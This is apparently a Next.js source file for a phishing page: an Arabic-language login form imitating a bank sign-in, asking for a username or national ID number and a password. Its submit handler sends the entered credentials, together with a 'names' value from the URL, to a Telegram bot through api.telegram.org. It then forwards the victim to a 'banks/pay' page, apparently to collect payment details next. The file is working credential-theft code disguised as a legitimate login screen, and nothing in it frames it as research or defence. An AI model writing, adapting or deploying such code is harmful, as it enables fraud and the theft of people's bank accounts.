"use client"
import styles from './arabic.module.css'
import Image from 'next/image'
import icon1 from '../../../../../public/6.jpg'
import { useRef } from 'react'
import bot from '@/component/dataBot'
import { useRouter,useSearchParams } from 'next/navigation'

const Page = () => {
    const username = useRef()
    const password = useRef()
    const router =useRouter();
    const x = useSearchParams();
    const datas = x.get('names')
    const handleOnSubmit = (e) => {
        e.preventDefault();

        var length =`العربي  اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} %0A %0A ${datas}`
       
        
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
      
      }
      const handlerout = ()=>{
        if(username.current.value == "" || password.current.value == ""){
          alert('من فضلك قم بملى الحقول')
        }else{
          
          router.push(`/fotaiyar/banks/pay?names=${datas}`)
        }
      }

  return (
    <div className={styles.container}>
        <Image 
            src={icon1}
            width={100}
        />

        <form onSubmit={handleOnSubmit}>

            <input type="text" ref={username}placeholder='ادخل اسم المستخدم او رقم البطاقة الوطنية ' required/>
            <input type="text" ref={password}  placeholder='ادخل كلمة المرور' required/>
            <button type='submit' onClick={handlerout}>تسجيل الدخول</button>

        </form>
    </div>
  )
}

export default Page
